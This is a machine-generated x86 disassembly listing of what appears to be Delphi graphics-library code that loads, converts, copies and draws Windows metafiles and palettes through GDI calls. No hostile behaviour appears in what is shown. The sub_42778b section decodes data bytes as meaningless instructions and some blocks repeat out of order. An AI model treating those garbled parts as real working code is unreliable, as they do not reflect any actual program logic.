call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_426b5c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_427b34
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_426b8c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_427b34
mov edx esi
mov eax ebx
call sub_418a84
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_427b30
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_426c20
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_424a0c
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_424a0c
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_424a0c
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_424a0c
push eax
call SelectPalette
sub_426cb8
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426e60
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426d1c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_422cb0
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_426da8
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426e60
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426e0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_427388
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41a8a0
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_426fc4
mov edx esi
mov eax ebx
call sub_426ef4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_426e60
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_427b34
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_427b30
pop esi
pop ebx
retn
sub_426e88
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_427388
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_426fc4
mov edx esi
mov eax ebx
call sub_426ef4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_426ef4
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_426e60
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41aacc
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_426fb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028d8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41aacc
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424cfc
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fbb
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
call sub_424cfc
sub_426fc4
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_426e60
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_424cfc
lea eax [ ebp - 0x22 ]
call sub_425b4c
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_427133
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424cfc
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42713a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026fc
retn
call sub_424cfc
sub_427144
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4271eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4271c9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4085ac
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c500
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40432c
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_426250
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271d0
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_427224
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426e60
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_427298
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_427298
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427298
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_426e60
pop esi
pop ebx
retn
mov eax ebx
call sub_4273e8
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4272d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_426e60
pop esi
pop ebx
retn
mov eax ebx
call sub_4273e8
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427314
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426e60
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4272d4
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4272d4
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427388
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41a8a0
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_4273e8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_426e60
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_427b34
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_427b30
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_42746c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41a8a0
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_427578
mov edx ebx
mov eax esi
call sub_4274ec
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_4274ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427568
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41ab04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
sub_427578
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402ba4
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41ab04
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41ab04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42769a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
call sub_424d5c
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_425b4c
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4276b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427693
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_4276c0
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_426e60
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_424ccc
sub_427744
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_42778b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
ja r-xdata
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
add [ eax + eax ] ah
add [ eax ] dl
and eax 0x33d80042
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec42b7e4
xor eax [ eax ]
loopne r-xdata
call sub_418470
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4248a8
test al al
je r-xdata
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42788a
push [ fs : eax ]
inc eax
add ah al
ja r-xdata
shl al 0x77
inc edx
add [ edi ] al
or eax 0x74694254
insd
popad
jo r-xdata
dec eax
cmp eax 0x0
jl r-xdata
inc edx
add [ eax - 0x75 ] ch
inc ecx
add [ eax - 0x75 ] dh
inc ecx
add [ edx + ecx * 4 + 0x4b680041 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4278b9
xor [ eax ] eax
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
ja r-xdata
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
popad
outsb
jbe r-xdata
mov [ ebp - 0x4 ] eax
rcl [ ebp + 0x68 ] 0xb2
js r-xdata
jbe r-xdata
popad
outsb
add [ edx + edi * 2 + 0x42 ] al
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
mov al [ ecx ]
push 0x5400424b
dec ebx
inc edx
rcl [ ebp + 0x68 ] 0x8a
js r-xdata
jae r-xdata
xor eax eax
pop edx
xor [ ecx ] al
add [ eax ] al
add [ edi + edi * 8 + 0x30 ] ah
mov eax [ rw-data ]
call sub_418898
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4279a4
add [ edi + edi * 8 + 0x30 ] ah
inc edx
add [ ebx + ecx * 2 + 0x42 ] dl
push 0x7000418b
mov eax [ ecx ]
test [ edx + 0x4b680041 ] cl
ja r-xdata
add [ ebp + 0x42 ] bh
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424904
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4278b2
push [ fs : eax ]
sub_427814
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4278b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4278b9
mov eax [ rw-data ]
call sub_418898
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42788a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4279a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424904
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418470
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4248a8
test al al
je r-xdata
sub_4278c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418834
mov esi eax
xor ecx ecx
push ebp
push sub_427930
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418898
retn
mov edx ebx
mov eax esi
call sub_418470
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4279a4
sub_42793c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42435c
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_427978
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_4279a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424420
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4279a4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424660
xor edx edx
push ebp
push sub_427a38
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424a8c
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418848
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424904
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_427a44
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424660
xor eax eax
push ebp
push sub_427b23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428d60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4278c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428e60
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
